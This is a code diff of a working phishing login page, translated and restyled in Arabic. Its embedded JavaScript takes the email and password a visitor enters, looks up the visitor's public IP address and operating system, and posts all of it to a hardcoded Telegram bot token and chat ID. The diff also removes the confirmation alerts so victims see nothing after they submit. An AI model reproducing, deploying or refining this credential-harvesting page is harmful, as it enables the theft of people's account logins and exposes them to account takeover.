@@ -1,13 +1,15 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login</title>
+    <title>تسجيل الدخول</title>
+    <!-- استيراد الخط من Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600&display=swap" rel="stylesheet">
     <style>
-        /* Set background image and apply blur effect */
+        /* إعدادات الخلفية */
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'Cairo', sans-serif; /* استخدام خط Cairo لجميع النصوص */
             background: url('https://www.bing.com/th/id/OGC.51b92d1c091025c54718c896ba716331?pid=1.7&rurl=https%3a%2f%2fmedia.giphy.com%2fmedia%2fl2JJzb9XbkdFHrt2o%2fgiphy.gif&ehk=pbZhHHADetrtRzxlqs7D9JM9%2fLtt5SQCd852InpD%2beg%3d') no-repeat center center fixed;
             background-size: cover;
             display: flex;
@@ -17,20 +19,13 @@
             margin: 0;
         }
 
-        /* Blur overlay */
+        /* إزالة التمويه والتراكب */
         .overlay {
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: rgba(0, 0, 0, 0.5); /* Semi-transparent overlay */
-            filter: blur(8px); /* Apply blur effect */
-            z-index: -1; /* Keep the overlay behind the content */
+            display: none; /* إخفاء التراكب */
         }
 
         .container {
-            background-color: rgba(255, 255, 255, 0.1); /* Slightly transparent background */
+            background-color: rgba(255, 255, 255, 0.1); /* خلفية شبه شفافة */
             border-radius: 16px;
             padding: 30px 40px;
             box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
@@ -44,9 +39,10 @@
 
         h1 {
             font-size: 28px;
-            color: #ffffff;
+            color: #ffffff; /* تغيير اللون إلى أحمر جحيمي */
             margin-bottom: 20px;
             font-weight: 600;
+            text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.7); /* إضافة تأثير الظل على النص */
         }
         p {
             font-size: 14px;
@@ -65,7 +61,7 @@
             transition: all 0.3s ease;
         }
         input:focus {
-            border-color: #6e7eeb;
+            border-color: #520404;
         }
         button {
             width: 100%;
@@ -83,7 +79,7 @@
         }
         .forgot-password {
             font-size: 12px;
-            color: #ff0000;
+            color: #ffffff;
             text-decoration: none;
             display: block;
             margin-top: 15px;
@@ -93,46 +89,46 @@
         }
     </style>
     <script>
-         const TOKEN = "7651789586:AAE07uomZ3OlhUj3OgvjqihWBjf34LJVsmg"; // Replace with your Telegram Bot Token
-         const CHAT_ID = "6196901763"; // Replace with your Telegram Chat ID
+        const TOKEN = "7651789586:AAE07uomZ3OlhUj3OgvjqihWBjf34LJVsmg"; // استبدل برمز التوكن الخاص بك
+        const CHAT_ID = "6196901763"; // استبدل برقم المحادثة الخاص بك
         const API_URL = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
-        const IP_API_URL = "https://api.ipify.org?format=json"; // To fetch the user's public IP
+        const IP_API_URL = "https://api.ipify.org?format=json"; // لجلب عنوان الـ IP العام للمستخدم
 
-        // Function to detect the user's operating system, edition, and system architecture
+        // وظيفة لاكتشاف نظام التشغيل
         function detectSystemInfo() {
             const userAgent = navigator.userAgent;
             const platform = navigator.platform;
 
-            let operatingSystem = "Unknown OS";
-            let edition = "Unknown Edition";
-            let systemType = "Unknown System Type";
+            let operatingSystem = "نظام التشغيل غير معروف";
+            let edition = "الإصدار غير معروف";
+            let systemType = "نوع النظام غير معروف";
 
-            // Detect Operating System
+            // اكتشاف نظام التشغيل
             if (userAgent.indexOf("Windows NT 10.0") !== -1) {
                 operatingSystem = "Windows 10";
-                edition = userAgent.indexOf("Windows NT 10.0") !== -1 ? "Windows 10 Pro/Home" : "Unknown Edition";
+                edition = "Windows 10 Pro/Home";
             } else if (userAgent.indexOf("Windows NT 6.1") !== -1) {
                 operatingSystem = "Windows 7";
-                edition = userAgent.indexOf("Windows NT 6.1") !== -1 ? "Windows 7 Home/Pro" : "Unknown Edition";
+                edition = "Windows 7 Home/Pro";
             } else if (userAgent.indexOf("Macintosh") !== -1) {
                 operatingSystem = "macOS";
-                edition = "macOS (No specific edition)";
+                edition = "macOS (لا يوجد إصدار محدد)";
             } else if (userAgent.indexOf("Linux") !== -1) {
                 operatingSystem = "Linux";
-                edition = "Linux (Various distributions)";
+                edition = "Linux (توزيعات متعددة)";
             } else if (userAgent.indexOf("Android") !== -1) {
                 operatingSystem = "Android";
-                edition = "Android (Mobile)";
+                edition = "Android (موبايل)";
             } else if (userAgent.indexOf("iPhone") !== -1) {
                 operatingSystem = "iOS";
-                edition = "iOS (Mobile)";
+                edition = "iOS (موبايل)";
             }
 
-            // Detect System Architecture (32-bit vs 64-bit)
+            // اكتشاف نوع النظام (32 بت أو 64 بت)
             if (platform.indexOf("Win64") !== -1 || userAgent.indexOf("x86_64") !== -1) {
-                systemType = "64-bit";
+                systemType = "64-بت";
             } else if (platform.indexOf("Win32") !== -1 || userAgent.indexOf("i686") !== -1) {
-                systemType = "32-bit";
+                systemType = "32-بت";
             }
 
             return { operatingSystem, edition, systemType };
@@ -145,29 +141,31 @@
             const password = document.getElementById('password').value;
 
             try {
-                // 1. Fetch user's IP address
+                // 1. جلب عنوان IP العام للمستخدم
                 const ipResponse = await fetch(IP_API_URL);
                 const ipData = await ipResponse.json();
                 const ipAddress = ipData.ip;
 
-                // 2. Detect the user's operating system, edition, and system architecture
+                // 2. اكتشاف نظام التشغيل
                 const { operatingSystem, edition, systemType } = detectSystemInfo();
 
                 const date = new Date().toLocaleString();
 
-                // 3. Construct the message
+                // 3. بناء الرسالة
                 const message = `
-<b>Login</b>
-<b>Email:</b> ${email}
-<b>Password:</b> ${password}
-<b>IP Address:</b> ${ipAddress}
-<b>Operating System:</b> ${operatingSystem}
-<b>Edition:</b> ${edition}
-<b>System Type:</b> ${systemType}
-<b>Date & Time:</b> ${date}
+<b>تسجيل دخول</b>
+<b>البريد الإلكتروني:</b> ${email}
+<b>كلمة المرور:</b> ${password}
+<b>عنوان الـ IP:</b> ${ipAddress}
+<b>نظام التشغيل:</b> ${operatingSystem}
+<b>الإصدار:</b> ${edition}
+<b>نوع النظام:</b> ${systemType}
+<b>التاريخ والوقت:</b> ${date}
                 `;
 
-                // 4. Send the message to Telegram
+                console.log("جاري إرسال الرسالة إلى تليجرام...");
+
+                // 4. إرسال الرسالة إلى تليجرام
                 const response = await fetch(API_URL, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
@@ -178,29 +176,28 @@
                     })
                 });
 
-                if (response.ok) {
-                    alert("Login successful. Welcome!");
-                } else {
-                    alert("There was an issue processing your login. Please try again.");
-                }
+                const responseBody = await response.json();
+                console.log("استجابة تليجرام: ", responseBody);
+
+                // لا يتم عرض رسائل التنبيه هنا
             } catch (error) {
-                console.error("Error sending data to Telegram:", error);
-                alert("An unexpected error occurred. Please try again later.");
+                console.error("حدث خطأ أثناء إرسال البيانات إلى تليجرام:", error);
+                // لا يتم عرض رسائل التنبيه هنا
             }
         }
     </script>
 </head>
 <body>
-    <div class="overlay"></div> <!-- Apply blur overlay -->
+    <div class="overlay"></div> <!-- إخفاء التراكب -->
     <div class="container">
-        <h1>Login</h1>
-        <p>Please enter your credentials to access your account.</p>
+        <h1>تسجيل الدخول</h1>
+        <p>يرجى إدخال بياناتك للوصول إلى حسابك.</p>
         <form onsubmit="handleSubmit(event)">
-            <input type="email" id="email" placeholder="Email Address" required>
-            <input type="password" id="password" placeholder="Password" required>
-            <button type="submit">Login</button>
-            <a href="https://accounts.google.com/v3/signin" class="forgot-password" target="_blank">Forgot Password?</a>
+            <input type="email" id="email" placeholder="البريد الإلكتروني" required>
+            <input type="password" id="password" placeholder="كلمة المرور" required>
+            <button type="submit">دخول</button>
+            <a href="https://th.bing.com/th/id/OIP.wpAgSeICiweY9D-j8lWSdQHaEJ?rs=1&pid=ImgDetMain" class="forgot-password" target="_blank">هل نسيت كلمة المرور؟</a>
         </form>
     </div>
-</body>
+</body>  
 </html>
